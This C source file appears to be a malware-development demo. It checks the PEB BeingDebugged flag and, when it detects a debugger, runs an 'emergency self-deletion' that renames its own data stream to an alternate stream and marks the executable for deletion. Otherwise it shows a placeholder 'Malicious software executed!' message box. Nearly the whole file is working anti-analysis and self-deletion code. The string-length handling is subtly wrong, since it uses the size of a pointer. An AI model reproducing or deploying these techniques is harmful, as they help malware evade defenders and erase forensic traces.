#include "mlw.h"

// https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fscc/c54dec26-1551-4d3a-a0ea-4fa40f848eb3
#define NEW_STREAM L":moh3a"

extern PPEB GetPEB(void);
extern DWORD CustomError(void);

BOOL CheckDebugger(void) {
	info("getting the PEB");
	PPEB pPEB = GetPEB();

	okay("\\___[ PEB\n\t\\_0x%p]\n", pPEB);
	info("checking for debugger presence");
	okay("[PEB->BeingDebugged: 0x%d]", pPEB->BeingDebugged);

	if (pPEB->BeingDebugged != 0) {
		warn("being debugged!");
		return TRUE;
	}

	okay("not being debugged!");
	return FALSE;
}

int SelfDelete(void) {
	HANDLE					hFile						=		INVALID_HANDLE_VALUE;							// the file handle is used to identify the file in many function calls
	const wchar_t*			NEWSTREAM					=		(const wchar_t*)NEW_STREAM;
	size_t					RenameSize					=		sizeof(FILE_RENAME_INFO) + sizeof(NEWSTREAM);
	PFILE_RENAME_INFO		PFRI						=		NULL;											// contains the target name to which the source file should be renamed
	WCHAR					PathSize[MAX_PATH * 2]		=		{ 0 };
	FILE_DISPOSITION_INFO	SetDelete					=		{ 0 };											// indicates whether a file should be deleted

	/*----------------------------[ALLOCATE BUFFER FOR FILE_RENAME_INFO]--------------------------------------*/
	PFRI = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, RenameSize);
	if (!PFRI) {
		warn("[HeapAlloc] failed to allocate memory, error: 0x%lx", CustomError());
		return EXIT_FAILURE;
	}
	
	// Fill blocks of memory with zeros
	ZeroMemory(PathSize, sizeof(PathSize));
	ZeroMemory(&SetDelete, sizeof(FILE_DISPOSITION_INFO));

	/*-----------------------------------[MARK A FILE FOR DELETION]-------------------------------------------*/
	SetDelete.DeleteFile = TRUE;

	/*------------------[SET NEW DATA STREAM BUFFER & SIZE IN FILE_RENAME_INFO]-------------------------------*/
	PFRI->FileNameLength = sizeof(NEWSTREAM);
	okay("set FILE_RENAME_INFO->FileName to %S", NEWSTREAM);
	RtlCopyMemory(PFRI->FileName, NEWSTREAM, sizeof(NEWSTREAM));
	okay("overwrote FILE_RENAME_INFO->FileName with %S data stream", NEWSTREAM);
	okay("\\___[ FILE_RENAME_INFO->FileName\n\t\\_%S", PFRI->FileName);

	/*-------------------------------------[GET CURRENT FILENAME]---------------------------------------------*/
	info("getting current filename");
	if (GetModuleFileNameW(NULL, PathSize, MAX_PATH * 2) == 0) {
		warn("[GetModuleFileNameW] failed to get filename, error: 0x%lx", CustomError());
		return EXIT_FAILURE;
	}

	/*----------------------------------------[GET FILE HANDLE]-----------------------------------------------*/
	info("starting the renaming process");
	info("getting handle to the current file");
	hFile = CreateFileW(PathSize, (DELETE | SYNCHRONIZE), FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		warn("[CreateFileW] failed to get a handle to the file, error: 0x%lx", CustomError());
		return EXIT_FAILURE;
	}
	okay("\\___[ hFile\n\t\\_0x%p", hFile);

	/*---------------------------------------------[RENAME]---------------------------------------------------*/
	if (!SetFileInformationByHandle(hFile, FileRenameInfo, PFRI, RenameSize)) {
		warn("[SetFileInformationByHandle] failed to rewrite the data stream, error: 0x%lx", CustomError());
	}
	okay("finished");
	info("closing handle to push the change");
	CloseHandle(hFile);
	okay("done! now beginning stage II");

	/*------------------------------------------[DELETION II]-------------------------------------------------*/
	info("getting handle to the current file, again");
	hFile = CreateFileW(PathSize, (DELETE | SYNCHRONIZE), FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		warn("[CreateFileW] failed to get a handle to the file, error: 0x%lx", CustomError());
		return EXIT_FAILURE;
	}
	okay("\\___[ hFile\n\t\\_0x%p", hFile);

	info("marking file for deletion");
	if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &SetDelete, sizeof(SetDelete))) {
		warn("[SetFileInformationByHandle] failed to mark file for deletion, error: 0x%ls", CustomError());
		return EXIT_FAILURE;
	}
	info("closing handle to file, this should delete the file");
	CloseHandle(hFile);
	info("freeing the allocation heap buffer");
	HeapFree(GetProcessHeap(), 0, PFRI);

	return EXIT_SUCCESS;
}

int main(void) {
	if (!CheckDebugger()) {
		info("executing payload.");
		MessageBoxW(NULL, L"Malicious software executed!", L"HELP", MB_ICONEXCLAMATION);
		return EXIT_SUCCESS;
	}

	info("beginning emergency self-deletion");
	SelfDelete();
}
